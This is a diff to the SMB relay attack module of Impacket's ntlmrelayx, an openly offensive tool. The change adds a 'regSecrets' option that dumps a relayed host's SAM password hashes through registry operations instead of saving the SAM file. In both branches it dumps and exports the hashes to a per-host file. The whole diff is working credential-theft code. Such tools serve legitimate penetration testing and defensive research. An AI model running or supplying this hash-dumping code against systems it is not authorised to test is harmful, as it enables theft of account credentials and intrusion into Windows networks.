@@ -157,7 +157,11 @@ class SMBAttack(ProtocolAttack):
                     LOG.error(str(e))
 
             else:
-                from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+                if (self.config.regSecrets):
+                    from impacket.examples.regsecrets import RemoteOperations, SAMHashes
+                else:
+                    from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+                    
                 from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
                 samHashes = None
                 try:
@@ -197,15 +201,20 @@ class SMBAttack(ProtocolAttack):
                     else:
                         bootKey = remoteOps.getBootKey()
                         remoteOps._RemoteOperations__serviceDeleted = True
-                        samFileName = remoteOps.saveSAM()
-                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                        if (self.config.regSecrets):
+                            LOG.debug("Dumping SAM with regsecrets")
+                            samHashes = SAMHashes(bootKey, remoteOps = remoteOps)
+                        else:
+                            LOG.debug("Dumping SAM with secretsdump")
+                            samFileName = remoteOps.saveSAM()
+                            samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                         samHashes.dump()
                         samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                         LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
                 except Exception as e:
                     LOG.error(str(e))
                 finally:
-                    if samHashes is not None:
+                    if (not self.config.regSecrets) and (samHashes is not None):
                         samHashes.finish()
                     if remoteOps is not None:
                         remoteOps.finish()
